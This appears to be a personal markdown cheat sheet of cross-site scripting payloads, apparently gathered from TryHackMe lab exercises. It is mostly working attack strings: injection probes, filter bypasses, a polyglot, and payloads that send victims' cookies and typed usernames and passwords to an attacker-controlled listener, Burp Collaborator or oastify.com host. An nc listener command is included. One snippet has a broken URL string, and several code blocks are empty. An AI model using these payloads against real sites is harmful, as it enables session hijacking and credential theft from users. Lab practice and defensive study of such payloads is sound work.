# XSS Payload Bank
**Update:** Use `print()` instead of `alert()` on Chrome
## THM Payloads
```javascript
<script>alert('THM');</script> 
```

`// Checking for XSS Vulnerability`



```javascript
"><script>alert('THM');</script>
```
` // Closing a tag before injecting payload`
```javascript
</textarea><script>alert('THM');</script> 
```
`// Closing a tag before injecting payload`

---
```javascript
';alert('THM');//

```

**NOTE**

The `'` closes the field specifying the name, then `;` signifies the end of the current command, and the `//` at the end makes anything after it a comment rather than executable code.

---

```javascript
<sscriptcript>alert('THM');</sscriptcript>
```
`Bypassing the filter`
```javascript
/images/cat.jpg" onload="alert('THM');
```
`Taking advantage of the onload="" attribute of the <img> tag`

### Polyglots

An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. 
```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```
### Sending Cookie to Hacker's Site
```bash
nc -lvnp <port>
```
```javascript
</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
```
***Using Burp Collaborator:***
```javascript
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
- The </textarea> tag closes the text area field.
- The <script> tag opens an area for us to write JavaScript.
- The fetch() command makes an HTTP request.
- URL_OR_IP is either the THM request catcher URL, your IP address from the THM AttackBox, or your IP address on the THM VPN Network.
- PORT_NUMBER is the port number you are using to listen for connections on the AttackBox.
?cookie= is the query string containing the victim’s cookies.
- btoa() command base64 encodes the victim’s cookies.
- document.cookie accesses the victim’s cookies for the Acme IT Support Website.
- </script>closes the JavaScript code block.

### A Repository of Polygots
[Ultimate XSS Polygot](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)


### Captures Username and Password
```javascript
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://8z8ffalhg6k3rf3maby5zzrrpiv9jz7o.oastify.com,{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

```javascript

```

```javascript

```

```javascript

```

```javascript

```

```javascript

```
